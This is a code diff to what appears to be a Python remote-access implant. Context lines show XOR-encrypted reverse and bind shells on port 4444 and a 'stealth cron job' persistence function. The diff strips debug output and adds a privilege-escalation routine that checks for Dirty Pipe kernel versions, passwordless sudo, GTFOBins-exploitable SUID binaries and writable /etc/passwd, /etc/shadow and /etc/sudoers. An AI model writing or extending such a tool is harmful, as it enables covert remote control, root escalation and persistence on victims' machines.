@@ -8,7 +8,7 @@ import argparse
 import time
 
 # --- CONFIGURATION ---
-VERSION = "2.0-ProtoFix"
+VERSION = "2.1-PrivEsc"
 DEFAULT_PORT = 4444
 XOR_KEY = b"GHOST" 
 
@@ -83,7 +83,6 @@ def reverse_shell(ip, port):
                 try:
                     decoded = xor_cipher(data)
                     cmd = decoded.decode(errors='ignore').strip()
-                    # print(f"DEBUG_CMD: {cmd}")
                 except Exception as e:
                     print(f"Decrypt Error: {e}")
                     continue
@@ -118,7 +117,6 @@ def bind_shell(port):
                 
                 decoded = xor_cipher(data)
                 cmd = decoded.decode(errors='ignore').strip()
-                # print(f"DEBUG_CMD_RECV: {cmd}")
                 
                 if cmd.lower() in ['exit', 'quit']: break
                 
@@ -151,12 +149,66 @@ def bind_shell(port):
         if server: server.close()
 
 def audit_system():
-    print("--- SYSTEM AUDIT ---")
-    print(f"OS: {platform.system()} {platform.release()}")
+    print("\n=== PRIVILEGE ESCALATION AUDIT ===")
+    
+    # 1. Basic Info
+    print("[*] System Info:")
+    print(f"    OS: {platform.system()} {platform.release()}")
     try:
-        print(f"User: {get_username()}")
+        print(f"    User: {get_username()} (UID: {os.getuid()})")
     except:
         pass
+
+    # 2. Kernel Exploit Check
+    print("\n[*] Kernel Vulnerabilities:")
+    kernel = platform.release()
+    if any(v in kernel for v in ["5.8", "5.10", "5.11", "5.12", "5.13", "5.14", "5.15"]):
+        print("    [!] POTENTIAL: Dirty Pipe (CVE-2022-0847) range detected.")
+    else:
+        print("    [+] No obvious kernel exploits in standard range.")
+
+    # 3. Sudo Rights (No Password)
+    print("\n[*] Sudo Rights (sudo -n -l):")
+    try:
+        # Check if sudo exists first
+        subprocess.check_output("which sudo", shell=True)
+        sudo_out = subprocess.check_output("sudo -n -l 2>/dev/null", shell=True).decode()
+        if sudo_out:
+            print(f"    [!] INTERESTING:\n{sudo_out}")
+        else:
+            print("    [-] No passwordless sudo rights found.")
+    except:
+        print("    [-] Access to sudo denied or password required.")
+
+    # 4. SUID Binaries (GTFOBins candidates)
+    print("\n[*] Dangerous SUID Binaries:")
+    dangerous_bins = ["nmap", "vim", "find", "bash", "more", "less", "nano", "cp", "python", "python3", "perl", "ruby"]
+    found_suid = []
+    try:
+        # Fast search for SUID files
+        cmd = "find /usr/bin /bin /usr/sbin /sbin -perm -4000 -type f 2>/dev/null"
+        suid_files = subprocess.check_output(cmd, shell=True).decode().splitlines()
+        
+        for f in suid_files:
+            bin_name = os.path.basename(f)
+            if bin_name in dangerous_bins:
+                print(f"    [!] CRITICAL: {f} (GTFOBins vector!)")
+                found_suid.append(f)
+        
+        if not found_suid:
+            print("    [-] No obviously exploitable SUID binaries found in standard paths.")
+    except Exception as e:
+        print(f"    [!] Error searching SUIDs: {e}")
+
+    # 5. Writeable Critical Files
+    print("\n[*] Writable System Files:")
+    for f in ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root"]:
+        if os.access(f, os.W_OK):
+            print(f"    [!] CRITICAL: {f} is writable!")
+        else:
+            pass # Silent if safe
+
+    print("\n=== AUDIT COMPLETE ===")
 
 def persist_access(payload):
     """Adds a stealth cron job."""
@@ -178,8 +230,10 @@ def persist_access(payload):
             print("[!] Persistence already appears to exist for this script.")
             return
 
-        new_cron = current_cron + entry
+        # Fix: Use /tmp to avoid permission issues
         tmp_cron_file = "/tmp/cron.tmp"
+        
+        new_cron = current_cron + entry
         
         with open(tmp_cron_file, "w") as f:
             f.write(new_cron)
